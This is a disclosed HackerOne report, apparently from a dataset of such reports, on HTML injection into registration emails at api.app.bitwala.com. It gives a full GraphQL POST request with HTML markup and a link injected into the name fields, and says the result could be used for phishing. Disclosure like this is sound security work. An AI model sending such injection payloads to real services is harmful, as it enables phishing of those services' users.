---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '786976'
original_report_id: '786976'
title: HTML injection in email content
team_handle: nuri
created_at: '2020-01-31T17:12:29.088Z'
disclosed_at: '2020-08-14T20:01:53.588Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 32
asset_identifier: api.app.bitwala.com
asset_type: URL
max_severity: critical
tags:
- hackerone
---

# HTML injection in email content

## Metadata

- HackerOne Report ID: 786976
- Weakness: 
- Program: nuri
- Disclosed At: 2020-08-14T20:01:53.588Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Hi,

I just found an issue when register account in https://app.bitwala.com/onboarding/preliminary. It allow hacker injection malicious text include html code in email content.
## Steps To Reproduce:
Make request register below with **payload html** in ==firstName== and ==lastName== parameter:

```
POST /graphql HTTP/1.1
Host: api.app.bitwala.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/json
Authorization: null
Origin: https://app.bitwala.com
Content-Length: 1188
Connection: close

{"operationName":"createIneligibleUser","variables":{"ineligibleUser":{"email":"dr.eamhope.aaa@gmail.com","firstName":"https://abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaa%20%22<b>hello</b><h1>hacker</h1><a href='abc.com'>XXXX</a>abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaacxcccc","lastName":"https://abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaa%20%22<b>hello</b><h1>hacker</h1><a href='abc.com'>XXXX</a>abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaacxcccc","addressCountry":"US","marketing":true,"locale":"en","token":"03AOLTBLRo4xtiJjci3-KF9cyHrmtCDjr-BORRjZT58NooOV6fkr4VLeRL2SqgVeXdX1NiJQCI6BHk97El0aKwJBuc9iUmtuxvZdvISyEZ4rYVgm3lEG8XxBBuhJzh0L_vUNBdbiOLGjoZyJgGf4R_Y6unX-dg7Wn4kjWDYkE25QIaGFNxS3YzDmp0e3GmN47UhZjpp14KIlfP9dpUqqleJytN2nJs068HfMjZM9d-7Etfv3YG0brkyVP_nMxXouKZARX9d1o7AXMGyykqDWVeB8e0iIuuFHpNkjEIqDVi6Af6Ch87fM5gXwDgr86PAzKyA-vrUZoahuhKhG71N-soh8gn_XsEiqCSGyS76ox20kr40diSu7Hh8Hzt_hKeZ_sMQd_yHqjpbBxkFO_jWSzkpcExmpBb4qHlFW_JrDNEi5gVXeGA3ZJ8CKk","identificationDocumentType":"DE:PASSPORT_ID_CARD"}},"query":"mutation createIneligibleUser($ineligibleUser: CreateIneligibleUserInput!) {\n  createIneligibleUser(ineligibleUser: $ineligibleUser)\n}\n"}
```
 
POC: {F702310}

## Impact

HTML injection, Phishing attacks
This vulnerability can lead to the reformatting/editing of emails from an official email address, which can be used in targeted phishing attacks.
This could lead to users being tricked into giving logins away to malicious attackers.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
